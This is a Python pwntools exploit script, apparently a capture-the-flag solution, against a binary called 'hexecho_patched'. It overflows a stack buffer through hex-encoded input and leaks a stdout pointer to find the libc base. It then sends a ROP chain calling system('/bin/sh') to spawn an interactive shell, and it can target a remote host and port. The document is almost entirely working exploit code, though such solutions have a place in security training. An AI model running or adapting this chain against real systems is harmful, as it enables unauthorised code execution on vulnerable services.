#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('hexecho_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 0x108 + 0x8
    size = offset + 0x10

    io.sendlineafter(b":", str(size).encode())

    for i in range(offset):
        io.sendline(b"-")
    
    payload = flat(
        [
            b"A"*8,
            exe.sym["main"] + 5
        ]
    )

    for i in range(len(payload)):
        val = hex(payload[i])[2:]
        io.sendline(val.encode())

    io.recvuntil(b"Received: ")
    leaked = io.recvline().strip(b"\n")
    byte_array = bytes.fromhex(leaked.decode())
    stdout = u64(byte_array[0x98:0x98+0x8])
    libc.address = stdout - 0x21b780
    
    info("libc base: %#x", libc.address)

    offset = 0x108 + 0x8
    
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]
    
    payload = flat(
        [
            b"B"*8,
            pop_rdi,
            sh,
            ret,
            system
        ]
    )

    size = offset + len(payload)
    
    io.sendlineafter(b":", str(size).encode())
    for i in range(offset):
        io.sendline(b"-")
    
    for i in range(len(payload)):
        val = hex(payload[i])[2:]
        io.sendline(val.encode())

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

